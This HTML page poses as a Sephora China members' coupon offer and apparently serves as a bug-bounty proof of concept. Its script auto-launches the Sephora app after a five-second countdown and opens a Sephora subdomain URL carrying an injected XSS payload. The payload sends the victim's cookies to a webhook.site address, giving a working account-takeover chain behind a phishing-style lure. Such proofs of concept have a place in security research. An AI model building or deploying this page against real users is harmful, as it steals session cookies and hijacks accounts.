<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>丝芙兰·会员福利中心</title>
<style>
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{font-family:-apple-system,'PingFang SC',sans-serif;margin:0;background:linear-gradient(160deg,#1a1a1a,#2d2d2d,#1a1a1a);color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;text-align:center}
.logo{font-size:52px;margin-bottom:6px}
h1{font-size:26px;margin:0 0 6px;letter-spacing:2px;color:#fff}
.sub{color:#c9a96e;font-size:13px;letter-spacing:4px;margin-bottom:20px}
.card{background:rgba(255,255,255,.06);border:1px solid rgba(201,169,110,.3);border-radius:16px;padding:24px 20px;width:100%;max-width:360px}
.btn{display:block;width:100%;max-width:320px;margin:12px auto;padding:16px;border:none;border-radius:28px;font-size:17px;font-weight:700;text-decoration:none;cursor:pointer}
.btn:active{transform:scale(.97)}
.btn1{background:linear-gradient(135deg,#c9a96e,#b8905a);color:#1a1a1a}
.status{font-size:12px;color:rgba(255,255,255,.5);margin-top:16px;min-height:18px}
.warn{font-size:11px;color:rgba(255,80,80,.6);margin-top:24px;line-height:1.6}
</style>
</head>
<body>
<div class="logo">💄</div>
<h1>SEPHORA 丝芙兰</h1>
<div class="sub">会员专属福利 · 限时领取</div>

<div class="card">
  <p style="font-size:13px;color:rgba(255,255,255,.7);margin:0 0 8px;line-height:1.6">
    PINK 卡会员专享<br>点击下方按钮在丝芙兰 APP 中领取
  </p>
  <button class="btn btn1" onclick="start()">
    🎁 领取新客优惠券
  </button>
  <div style="font-size:11px;color:rgba(255,255,255,.4);margin-top:4px">
    演示: deeplink → App WebView → 子域XSS → Cookie 出网
  </div>
</div>

<div class="status" id="st">⏳ <span id="cd">5</span> 秒后自动跳转丝芙兰 APP…（点击按钮立即领取）</div>

<div class="warn">
  ⚠️ 授权安全测试演示页 (SRC PoC)<br>
  点击后拉起丝芙兰 APP 并演示账号接管链<br>
  全程零 frida · 零工具 · 零点击(自动跳转)
</div>

<script>
// ★ WEBHOOK 可替换: URL 加 ?webhook=<uuid> 或 ?webhook=<完整接收URL>
//   示例: sephora-guide.html?webhook=12345678-xxxx       → https://<uuid>.webhook.site/ato
//         sephora-guide.html?webhook=https://x.com/collect → 原样使用
//   不带参数则用下方默认值
var _wp = new URLSearchParams(location.search).get('webhook');
var WEBHOOK = !_wp ? 'https://b9f18d75-0f59-46d7-a472-60d7e829ad3f.webhook.site/ato'
  : (_wp.indexOf('http') === 0 ? _wp : 'https://' + _wp + '.webhook.site/ato');

function buildPayload() {
  return "<img src=x onerror=\"new Image().src='" + WEBHOOK +
    "?c='+encodeURIComponent(location.origin+'|||'+document.cookie.substring(0,500))\">";
}

var started = false;
function start() {
  if (started) return; started = true;
  var st = document.getElementById('st');
  st.textContent = "⚡ 正在拉起丝芙兰 APP…";

  var xssUrl = "https://wx.sephora.cn/m/booking.html#/vicMsg?type=3&msg=" +
    encodeURIComponent(buildPayload());
  location.href = "sephora://openurl?url=" + encodeURIComponent(xssUrl);
  setTimeout(function() {
    if (!document.hidden) {
      st.textContent = "↗️ 尝试 intent:// 回退…";
      location.href = "intent://openurl?url=" + encodeURIComponent(xssUrl) +
        "#Intent;scheme=sephora;package=com.arvato.sephora.app;end;";
    }
  }, 1500);
  setTimeout(function(){ st.textContent = "✅ 请查看 webhook 收证页面"; }, 4000);
}

// 倒计时自动跳转
var n = 5;
var cdTimer = setInterval(function() {
  n--;
  var el = document.getElementById('cd');
  if (el) el.textContent = n;
  if (n <= 0) { clearInterval(cdTimer); start(); }
}, 1000);
</script>
</body>
</html>
